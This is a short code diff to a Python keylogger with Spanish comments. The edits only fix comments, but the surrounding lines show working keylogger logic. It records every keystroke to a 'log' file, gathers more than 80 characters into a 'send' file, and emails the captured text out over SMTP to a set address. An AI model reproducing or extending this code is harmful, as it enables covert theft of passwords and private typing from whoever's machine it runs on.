@@ -29,7 +29,7 @@ def captura(key):
     file = open("log", "r")
     data=file.read()
     file.close()
-    # Si el archivo tiene mas 10 caracteres envia el correo.
+    # Si el archivo tiene mas 80 caracteres envia el correo.
     if len(data)>80:
         # Crea un segundo archivo para enviar y no interrumpir el guardado del primero.
         fil=open("send","a")
@@ -69,6 +69,6 @@ def enviar():
     smtp.sendmail("CorreoFrom@outlook.com","CorreoTo@hotmail.com",msg.as_string())
     # Cerrar la conexión con el servidor SMTP.
     smtp.quit()
-# Escucha las pulsaciones del teclado y cuando se pulsa una tecla llama a la funcion captura.
+# Escucha las pulsaciones del teclado y cuando se pulsa una tecla llama a la función captura.
 with Listener(on_press=captura) as Listen:
     Listen.join()
